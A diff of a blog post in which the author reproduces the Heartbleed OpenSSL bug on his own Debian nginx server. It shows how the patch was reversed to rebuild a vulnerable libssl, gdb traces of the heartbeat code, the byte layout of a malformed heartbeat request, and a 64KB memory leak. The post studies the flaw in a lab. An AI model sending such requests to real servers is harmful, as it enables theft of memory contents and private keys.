@@ -3,7 +3,7 @@ layout: post
 title:  "Exploiting Heartbleed bug"
 date:   2014-08-23 13:31:48
 categories: jekyll update
-published: no
+published: yes
 pygments: true
 ---
 
@@ -18,8 +18,8 @@ The bug
 =======
 
 Hearbleed, CVE-2014-0160 in the Common Vulnerabilities and Exposures system, 
-is a bug which affects OpenSSL library 
-and allows an attacker to retrieve a 64KB chunk from the address space of the
+is a bug which affects OpenSSL library and allows an attacker to retrieve a 64KB 
+chunk of memory from the address space of the
 process which is using the library. The bug resides in the implementation of one
 of the features of the TLS protocol, the TLS Hearbeat Extension, and affects
 OpenSSL from version 1.0.1 to 1.0.1f included.
@@ -50,35 +50,37 @@ RAND_pseudo_bytes(bp, padding);
 {% endhighlight %}
 
 *payload* is the length of the payload of the HB request sent from the client. This
-value is read from the request itself. *pl* is a pointer to the buffer containing 
+value is read from the HB message itself. *pl* is a pointer to the buffer containing 
 the payload sent by the client. What causes the bug is that
 the payload length advertised by the client is never checked against the actual
 length of the buffer received. A client might specify a length of N bytes, but
 send instead only M bytes, with M < N. When sending back the response,
 the server copies *payload* bytes from the buffer pointed by *pl*, which has been
 allocated by the server to store the HB request. So in principle a client can
-send a HB with an arbitrary length value, and it will get back a chunk of memory
+send a HB message with an arbitrary length value, and it will get back a chunk of memory
 from the server address space. The *payload* field is actually 16 bits long,
-so the maximum length is 64KB.
+so the maximum length is 64KB. The bug can be easily fixed by checking that the advertised
+length of the payload matches the actual length. A <a href="http://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=731f431497f463f3a2a97236fe0187b11c44aead" target="_blank">patch</a> 
+was released soon after the disclosure of the bug.
 
 
-Those 64KB leaked could contain everything which lives in the process address space. 
+Those 64KB leaked by the server could contain everything which lives in the process address space. 
 Of course the worst case scenario is a server leaking a chunk of memory which
 contains the private keys used for the SSL connection. Soon after the bug went
 public, Cloudflare announced the Heartbleed Challange, asking the community to
 steal the private keys from a nginx instance running on their servers. According
 to their very early experiments, they thought [this would not happen](#cloudflare_analysis), 
 but it turned out they were wrong. In fact, at least four people were able to steal 
-the private keys exploiting the heartbleed challenge, Fedor Indutny being the first one.
+the private keys exploiting the heartbleed bug, Fedor Indutny being the first one.
 
 
 
 openssl package
 ===============
 
-I wanted to try to steal the private keys from my own instance. I am
+My idea was to try to steal the private keys from my own instance. I am
 running Debian Wheezy 7.1 and, according to apt, the openssl version I have
-installed on my machine is 1.0.1e.
+installed on my machine is *1.0.1e*.
 
 {% highlight console lineos %}
 ➜  ~ [1] at 15:48:42 [Sun 1] $ sudo apt-cache policy openssl    
@@ -106,15 +108,12 @@ options:  bn(64,32) rc4(8x,mmx) des(ptr,risc1,16,long) blowfish(idx)
 [...]
 {% endhighlight %}
 
-The changelog for openssl_1.0.1e-2+deb7u14 is available 
-[here](http://metadata.ftp-master.debian.org/changelogs/main/o/openssl/).
- 
-On April the 8th, heartbleed bug was fixed and a patch was applied to the package
+The changelog for *openssl_1.0.1e-2+deb7u14* is available 
+<a href="http://metadata.ftp-master.debian.org/changelogs/main/o/openssl/openssl_1.0.1e-2+deb7u14_changelog" target="_blank">here</a>.
+On April the 7th, heartbleed bug was fixed and a patch was applied to the package
 incrementing the release to deb7u5.
 
 {% highlight console lineos %} 
-
-Salvatore Bonaccorso <carnil@debian.org>  Tue, 08 Apr 2014 10:44:53 +0200
 
 openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
 
@@ -124,23 +123,15 @@ openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
     A missing bounds check in the handling of the TLS heartbeat extension
     can be used to reveal up to 64k of memory to a connected client or
     server.
+
+ -- Salvatore Bonaccorso <carnil@debian.org>  Mon, 07 Apr 2014 22:26:55 +0200
 {% endhighlight %} 
 
-The package installed on the machine is therefore not vulnerable. And it can
-be easily verified by sending a malformed HB request. In this case, the server
-does not reply.
-
-    ➜  ~ [1] at 15:59:47 [Sun 1] $ ./check_hb
-    Initializing new connection...
-    Connecting...
-    Connected!
-    resplen:      0
-
-In order to
-restore the bug, it is necessary to rebuild the package avoiding the application of
+The openssl version installed on my machine is therefore not vulnerable. In order to
+restore the bug, the package must be rebuilt avoiding the application of
 the patch. When the source deb file is downloaded, the patches are applied automatically.
 The easiest way to build a vulnerable package it to apply a reverse patch. The 
-following commands can be used:
+following commands can be used.
 
 
 {% highlight console lineos %}
@@ -155,18 +146,18 @@ patch -p1 < hb_reversed.patch
 The patch should apply successfully. The changes must be committed with dpkg-source 
 --commit (it is not possible to compile the new package until then). This will
 create the "official" patch out of the differences in the codebase. When committing,
-you will be asked for a description of the fix, which will be appended on the 
+a description of the fix must be entered: this will be appended on the 
 top of the .patch file. In order to modify the changelog, dch can be used, which is part
 of devscripts in Debian.
 
 *dch -i*  opens an editor where a new entry in the changelog can be added. 
 The version which appears in the changelog will be the one displayed
-by apt. For instance, in my case I incremented my version to 1.0.1e-2+deb7u14.1.
+by apt. For instance, in my case I incremented my version to *1.0.1e-2+deb7u14.1*.
 The package can be build with  *dpkg-buildpackage -us -uc*.
 
-Once finished, openssl\_1.0.1e-2+deb7u14.1\_i386.deb and related packages will be
-available. Heartbleed vulnerability comes from libssl1.0.0, so the package that should be
-installed is libssl1.0.0\_1.0.1e-2+deb7u14.1\_i386.deb.
+Once finished, *openssl\_1.0.1e-2+deb7u14.1\_i386.deb* and related packages will be
+available. Heartbleed vulnerability comes from libssl1.0.0 and the package 
+that should be installed is *libssl1.0.0\_1.0.1e-2+deb7u14.1\_i386.deb*.
 
 
  {% highlight console lineos %}
@@ -190,9 +181,8 @@ libssl1.0.0:
         500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
 {% endhighlight %}
 
-
-In case you want to revert to the old clean version, apt allows to define a
-specific revision on the command line.
+It is possible to revert to the old clean package by defining a
+specific version on the command line.
 
 {% highlight console lineos %} 
 ➜  /tmp [1] at 16:38:25 [Sat 7] $ sudo apt-get install libssl1.0.0=1.0.1e-2+deb7u14
@@ -235,7 +225,7 @@ in the configuration file, */etc/nginx/nginx.conf* by default.
 
 Heartbeat request
 =================
-The very first step was to try to send a proper hearbeat request to the nginx
+The very first step is to try to send a proper hearbeat request to the nginx
 instance.
 
     0x18                    # Type: Heartbeat
@@ -250,25 +240,514 @@ instance.
     0x93 0xDD 0x7D 0xB5     #
 
 It turned out to be a bit more complicated than that. The HB message is sent
-to the server and wireshark decodes it properly which means that the message is formatted
-correctly as the following picture shows.
+to the server but no response whatsoever is returned. The following picture shows
+that Wireshark decodes properly the SSL record, which means that the message can
+be considered as properly formatted.
 
 <p align="center">
 <a id="single_image" href="/img/hb_good_request_detail.png"><img src="/img/hb_good_request_detail.png" alt=""/></a>
 </p>
 
-However, no response message whatsoever is returned, the server does not reply.
-At the beginning I could not explain that: even though the handshake is not terminated,
- the server should reply anyway with a HB response message. After several unsuccessful 
-attempts, I decided to go more in depth by following step by step the execution
-on the server side.
+Even if the SSL handshake is not terminated, as shown by the picture below, 
+the server should reply anyway with a HB response message. After several 
+unsuccessful attempts, I decided to go more in depth by following step by 
+step the execution on the server side.
 
 <p align="center"> 
 <a id="single_image" href="/img/hb_good_request.png"><img src="/img/hb_good_request.png" alt=""/></a>
 </p>
 
-In order to quickly check if the local instance is vulnerable
 
+Executing libssl under gdb
+=========================
+
+In order to execute libssl code step by step, the sources must be compiled with
+debug symbols and without optimization. Step by step execution of optimized code is very tricky, as
+it's difficult to map the assembly code to the original source due to optimizations 
+like instruction reordering, loop unrolling, inlining. The easiest way is to simply
+turn off optimizations. CFLAGS used by dpkg can be set in /etc/dpkg/buildflags.conf.
+In this specific case, the following directive does the job.
+
+    SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security  
+
+After recompiling  libssl1.0.0, the debugging symbols should be embedded in the library,
+therefore the debug package (libssl1.0.0-dbg\_1.0.1e-2+deb7u14.\_i386) should
+not be necessary. A further simplification which makes the debugging easier is
+to set
+
+    worker_processes 1;
+
+in /etc/nginx/nginx.conf, so that there is just one thread serving the requests
+coming from the clients. nginx must be stopped and restarted and gdb can
+then be attached to the worker process.
+
+    ➜  ~ [1] at 10:15:57 [Thu 12] $ ps aux | grep nginx
+    root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
+    www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
+    marco     5258  0.0  0.0   3548   804 pts/0    S+   10:15   0:00 grep nginx
+    ➜  ~ [1] at 10:15:58 [Thu 12] $ sudo gdb           
+    GNU gdb (GDB) 7.4.1-debian
+    Copyright (C) 2012 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+    and "show warranty" for details.
+    This GDB was configured as "i486-linux-gnu".
+    For bug reporting instructions, please see:
+    <http://www.gnu.org/software/gdb/bugs/>.
+    (gdb) attach 5211
+
+
+gdb executes the ptrace system call and starts tracing nginx. It then tries to load the
+symbols of all the shared objects mapped in the address space of the process, including
+libssl.so.1.0.0. If gdb fails to load the symbols for libssl, then something went wrong.
+
+    Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
+    Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0
+
+gdb should also be pointed to the location of the source code with the *directory*
+command.
+
+    (gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
+    Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd
+
+A breakpoint on *tls1_process_heartbeat* can be set and the execution resumed.
+
+    (gdb) break tls1_process_heartbeat
+    Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
+    (gdb) c
+    Continuing.
+
+Now, upon receiving a HB message, the code will hit the breakpoint, allowing
+step by step execution.
+
+
+    Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
+    2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
+    (gdb) s
+    2582        unsigned int padding = 16; /* Use minimum padding */
+    (gdb) s
+    2585        hbtype = *p++;
+    (gdb) s
+    2586        n2s(p, payload);
+    (gdb) 
+    2587        pl = p;
+    (gdb)
+
+
+The control path which explains why a HB response is not returned
+is quite complicated and without a proper knowledge of the
+library it's difficult to grasp what the code actually does. After
+a series of *step* and *next*, the single step execution led to the function
+*buffer_write* in *bf_buff.c*. The whole trace is reported below.
+
+{% highlight console linenos %}
+Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
+2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
+(gdb) s
+2582        unsigned int padding = 16; /* Use minimum padding */
+(gdb) s
+2585        hbtype = *p++;
+(gdb) s
+2586        n2s(p, payload);
+(gdb) 
+2587        pl = p;
+(gdb) 
+2589        if (s->msg_callback)
+(gdb) 
+2594        if (hbtype == TLS1_HB_REQUEST)
+(gdb) 
+2603            buffer = OPENSSL_malloc(1 + 2 + payload + padding);
+(gdb) n
+2604            bp = buffer;
+(gdb) 
+2607            *bp++ = TLS1_HB_RESPONSE;
+(gdb) 
+2608            s2n(payload, bp);
+(gdb) 
+2609            memcpy(bp, pl, payload);
+(gdb) 
+2610            bp += payload;
+(gdb) 
+2612            RAND_pseudo_bytes(bp, padding);
+(gdb) 
+2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
+(gdb) s
+    ssl3_write_bytes (s=0x9910a58, type=24, buf_=0x99609a8, len=23) at s3_pkt.c:584
+    584     const unsigned char *buf=buf_;
+    (gdb) 
+    588     s->rwstate=SSL_NOTHING;
+    (gdb) 
+    589     tot=s->s3->wnum;
+    (gdb) 
+    590     s->s3->wnum=0;
+    (gdb) 
+    592     if (SSL_in_init(s) && !s->in_handshake)
+    (gdb) n
+    603     n=(len-tot);
+    (gdb) 
+    606         if (n > s->max_send_fragment)
+    (gdb) 
+    609             nw=n;
+    (gdb) 
+    611         i=do_ssl3_write(s, type, &(buf[tot]), nw, 0);
+    (gdb) s
+        do_ssl3_write (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23, 
+        create_empty_fragment=0) at s3_pkt.c:638
+        638     int i,mac_size,clear=0;
+        (gdb) n
+        639     int prefix_len=0;
+        (gdb) 
+        641     long align=0;
+        (gdb) 
+        643     SSL3_BUFFER *wb=&(s->s3->wbuf);
+        (gdb) 
+        649     if (wb->left != 0)
+        (gdb) 
+        653     if (s->s3->alert_dispatch)
+        (gdb) 
+        661     if (wb->buf == NULL)
+        (gdb) 
+        662         if (!ssl3_setup_write_buffer(s))
+        (gdb) 
+        665     if (len == 0 && !create_empty_fragment)
+        (gdb) 
+        668     wr= &(s->s3->wrec);
+        (gdb) 
+        669     sess=s->session;
+        (gdb) 
+        671     if (    (sess == NULL) ||
+        (gdb) 
+        672         (s->enc_write_ctx == NULL) ||
+        (gdb) 
+        671     if (    (sess == NULL) ||
+        (gdb) 
+        676         clear=s->enc_write_ctx?0:1; /* must be AEAD cipher */
+        (gdb) 
+        680         mac_size=0;
+        (gdb) 
+        690     if (!clear && !create_empty_fragment && !s->s3->empty_fragment_done)
+        (gdb) 
+        717     if (create_empty_fragment)
+        (gdb) 
+        730     else if (prefix_len)
+        (gdb) 
+        737         align = (long)wb->buf + SSL3_RT_HEADER_LENGTH;
+        (gdb) 
+        738         align = (-align)&(SSL3_ALIGN_PAYLOAD-1);
+        (gdb) 
+        740         p = wb->buf + align;
+        (gdb) 
+        741         wb->offset  = align;
+        (gdb) 
+        746     *(p++)=type&0xff;
+        (gdb) 
+        747     wr->type=type;
+        (gdb) 
+        749     *(p++)=(s->version>>8);
+        (gdb) 
+        753     if (s->state == SSL3_ST_CW_CLNT_HELLO_B
+        (gdb) 
+        758         *(p++)=s->version&0xff;
+        (gdb) 
+        761     plen=p; 
+        (gdb) 
+        762     p+=2;
+        (gdb) 
+        764     if (s->enc_write_ctx && s->version >= TLS1_1_VERSION)
+        (gdb) 
+        780         eivlen = 0;
+        (gdb) 
+        783     wr->data=p + eivlen;
+        (gdb) 
+        784     wr->length=(int)len;
+        (gdb) 
+        785     wr->input=(unsigned char *)buf;
+        (gdb) 
+        791     if (s->compress != NULL)
+        (gdb) 
+        801         memcpy(wr->data,wr->input,wr->length);
+        (gdb) 
+        802         wr->input=wr->data;
+        (gdb) 
+        809     if (mac_size != 0)
+        (gdb) 
+        816     wr->input=p;
+        (gdb) 
+        817     wr->data=p;
+        (gdb) 
+        819     if (eivlen)
+        (gdb) 
+        827     s->method->ssl3_enc->enc(s,1);
+        (gdb) 
+        830     s2n(wr->length,plen);
+        (gdb) 
+        835     wr->type=type; /* not needed but helps for debugging */
+        (gdb) 
+        836     wr->length+=SSL3_RT_HEADER_LENGTH;
+        (gdb) 
+        838     if (create_empty_fragment)
+        (gdb) 
+        847     wb->left = prefix_len + wr->length;
+        (gdb) 
+        850     s->s3->wpend_tot=len;
+        (gdb) 
+        851     s->s3->wpend_buf=buf;
+        (gdb) 
+        852     s->s3->wpend_type=type;
+        (gdb) 
+        853     s->s3->wpend_ret=len;
+        (gdb) 
+        856     return ssl3_write_pending(s,type,buf,len);
+        (gdb) s
+        ssl3_write_pending (s=0x9910a58, type=24, buf=0x99609a8 "\002", len=23)
+            at s3_pkt.c:866
+            866     SSL3_BUFFER *wb=&(s->s3->wbuf);
+            (gdb) n
+            869     if ((s->s3->wpend_tot > (int)len)
+            (gdb) 
+            870         || ((s->s3->wpend_buf != buf) &&
+            (gdb) 
+            872         || (s->s3->wpend_type != type))
+            (gdb) 
+            880         clear_sys_error();
+            (gdb) 
+            881         if (s->wbio != NULL)
+            (gdb) 
+            883             s->rwstate=SSL_WRITING;
+            (gdb) 
+            886                 (unsigned int)wb->left);
+            (gdb) 
+            884             i=BIO_write(s->wbio,
+            (gdb) 
+            885                 (char *)&(wb->buf[wb->offset]),
+            (gdb) 
+            884             i=BIO_write(s->wbio,
+            (gdb) s
+                BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:227
+                227     if (b == NULL)
+                (gdb) n
+                230     cb=b->callback;
+                (gdb) 
+                231     if ((b->method == NULL) || (b->method->bwrite == NULL))
+                (gdb) 
+                237     if ((cb != NULL) &&
+                (gdb) 
+                241     if (!b->init)
+                (gdb) 
+                247     i=b->method->bwrite(b,in,inl);
+                (gdb) s
+                    buffer_write (b=0x99128b0, in=0x995b8cb "\030\003\002", inl=28) at bf_buff.c:199
+                    199     int i,num=0;
+                    (gdb) n
+                    202     if ((in == NULL) || (inl <= 0)) return(0);
+                    (gdb) 
+                    203     ctx=(BIO_F_BUFFER_CTX *)b->ptr;
+                    (gdb) 
+                    204     if ((ctx == NULL) || (b->next_bio == NULL)) return(0);
+                    (gdb) 
+                    206     BIO_clear_retry_flags(b);
+                    (gdb) 
+                    208     i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
+                    (gdb) 
+                    210     if (i >= inl)
+                    (gdb) 
+                    212         memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
+                    (gdb) 
+                    213         ctx->obuf_len+=inl;
+                    (gdb) 
+                    214         return(num+inl);
+                    (gdb) 
+                    268     }
+                    (gdb) 
+                BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:249
+                249     if (i > 0) b->num_write+=(unsigned long)i;
+{% endhighlight %}
+
+The *buffer_write* function is defined in crypto/bio/bf_buf.c as follows.
+
+{% highlight C linenos %}
+static int buffer_write(BIO *b, const char *in, int inl)
+        {
+        int i,num=0;
+        BIO_F_BUFFER_CTX *ctx;
+
+        if ((in == NULL) || (inl <= 0)) return(0);
+        ctx=(BIO_F_BUFFER_CTX *)b->ptr;
+        if ((ctx == NULL) || (b->next_bio == NULL)) return(0);
+
+        BIO_clear_retry_flags(b);
+start:
+        i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
+        /* add to buffer and return */
+        if (i >= inl)
+                {
+                memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,inl);
+                ctx->obuf_len+=inl;
+                return(num+inl);
+                }
+        /* else */
+        /* stuff already in buffer, so add to it first, then flush */
+        if (ctx->obuf_len != 0)
+                {
+                if (i > 0) /* lets fill it up if we can */
+                        {
+                        memcpy(&(ctx->obuf[ctx->obuf_off+ctx->obuf_len]),in,i);
+                        in+=i;
+                        inl-=i;
+                        num+=i;
+                        ctx->obuf_len+=i;
+                        }
+                /* we now have a full buffer needing flushing */
+                for (;;)
+                        {
+                        i=BIO_write(b->next_bio,&(ctx->obuf[ctx->obuf_off]),
+                                ctx->obuf_len);
+                        if (i <= 0)
+                                {
+                                BIO_copy_next_retry(b);
+
+                                if (i < 0) return((num > 0)?num:i);
+                                if (i == 0) return(num);
+                                }
+                        ctx->obuf_off+=i;
+                        ctx->obuf_len-=i;
+                        if (ctx->obuf_len == 0) break;
+                        }
+                }
+        /* we only get here if the buffer has been flushed and we
+         * still have stuff to write */
+        ctx->obuf_off=0;
+
+        /* we now have inl bytes to write */
+        while (inl >= ctx->obuf_size)
+                {
+                i=BIO_write(b->next_bio,in,inl);
+                if (i <= 0)
+                        {
+                        BIO_copy_next_retry(b);
+                        if (i < 0) return((num > 0)?num:i);
+                        if (i == 0) return(num);
+                        }
+                num+=i;
+                in+=i;
+                inl-=i;
+                if (inl == 0) return(num);
+                }
+
+        /* copy the rest into the buffer since we have only a small 
+         * amount left */
+        goto start;
+        }
+{% endhighlight %}
+
+This function basically writes the data passed as argument with pointer *\*in* into
+the buffer pointed by the BIO object *\*b*. The decision whether to flush or not
+the buffer through the socket is taken based on the size of the data with respect to 
+the size of the BIO buffer. If the former is smaller than the latter, the buffer is
+not flushed (line 14). The HB response message here is 28 bytes and the buffer is 4KB,
+therefore there's no flushing.
+
+    (gdb) print i
+    $1 = 4096
+    (gdb) print inl
+    $2 = 28
+
+What happens if the size of the HB message is bigger than the buffer, say 5000
+bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a> 
+**[2]** to send a properly formed heartbeat request and
+the trace of *buffer_write* is shown below.
+
+    (gdb) 
+    247     i=b->method->bwrite(b,in,inl);
+    (gdb) s
+    buffer_write (b=0x9960ae8, in=0x995b8cb "[content of the buffer, omitted]"..., inl=5000) at bf_buff.c:199
+    199     int i,num=0;
+    (gdb) print inl
+    $3 = 5000
+    (gdb) n
+    202     if ((in == NULL) || (inl <= 0)) return(0);
+    (gdb) 
+    203     ctx=(BIO_F_BUFFER_CTX *)b->ptr;
+    (gdb) 
+    204     if ((ctx == NULL) || (b->next_bio == NULL)) return(0);
+    (gdb) 
+    206     BIO_clear_retry_flags(b);
+    (gdb) 
+    208     i=ctx->obuf_size-(ctx->obuf_len+ctx->obuf_off);
+    (gdb) 
+    210     if (i >= inl)
+    (gdb) 
+    218     if (ctx->obuf_len != 0)
+    (gdb) 
+    247     ctx->obuf_off=0;
+    (gdb) print ctx->obuf_len
+    $4 = 0
+    (gdb) n
+    250     while (inl >= ctx->obuf_size)
+    (gdb) 
+    252         i=BIO_write(b->next_bio,in,inl);
+    (gdb) 
+    253         if (i <= 0)
+    (gdb) 
+    259         num+=i;
+    (gdb) 
+    260         in+=i;
+    (gdb) 
+    261         inl-=i;
+    (gdb) 
+    262         if (inl == 0) return(num);
+    (gdb) 
+    268     }
+    (gdb) 
+    BIO_write (b=0x9960ae8, in=0x995b8cb, inl=5000) at bio_lib.c:249
+    249     if (i > 0) b->num_write+=(unsigned long)i;
+    (gdb) print i
+    $5 = 5000
+ 
+
+5000 bytes are written and flushed in the output buffer in the loop at line 54.
+The client receives a proper response as shown in the network dump below.
+<p align="center"> 
+<a id="single_image" href="/img/hb_working_response.png"><img src="/img/hb_working_response.png" alt=""/></a>
+</p>
+
+
+Heartbleed request
+=========================
+
+An example of malformed heartbeat request is shown below.
+
+    0x18                    # Type: Heartbeat
+    0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2) 
+    0x00 0x03               # Record length, size of the heartbeat message
+    0x01                    # HB message type: request
+    0xFF 0xFF               # Payload size, does not match the actual size of the payload
+                            # No payload
+
+The server will return 65536 bytes copied from the address space of the process,
+as explained at the beginning of the page. <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
+can be adapted to send a malformed request. The result is the following.
+
+    ➜  ~/heartbleed [1] at 12:35:56 [Thu 12] $ ./send_heartbleed
+    Initializing new connection...
+    Connecting...
+    Connected!
+    resplen:  65556
+
+As expected, the HB response message contains 65536 bytes of payload, 16 bytes
+of padding and 4 bytes of header, 65556 in total.
+
+Scanning leaked memory
+=============================
+
+After setting up my local nginx instance with a newly generated private/public
+key pair, I tried to look for a prime factor that could divide *n* (part of the 
+public key) in the memory leaked by the server. I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/exploit.c" target="_blank">
+exploit.c</a> to exploit the bug. With *ulimit*, I capped the maximum size of 
+the virtual address space of the process at 256MB and I fired up 8 parallel 
+instances of the script. After ~3M requests, I could not find any trace of the 
+private keys.
 
 
 [jekyll-gh]: https://github.com/mojombo/jekyll
@@ -276,15 +755,10 @@ In order to quickly check if the local instance is vulnerable
 
 
 
-
-
-
-
-
-
 <hr width="30%" style="margin-bottom:20px;margin-top:20px"/>
 <ul class="references">
-</li> <a name="cloudflare_analysis">[1] [CloudFlare Analysis of HeartBleed](https://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed/)
+<li> <a name="cloudflare_analysis">[1] [CloudFlare Analysis of HeartBleed](https://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed/)</li>
+<li> <a name="heartbeat_send">[2] [Code to send a heartbeat message](https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c) </li>
 </a> </li>
 </ul>
 
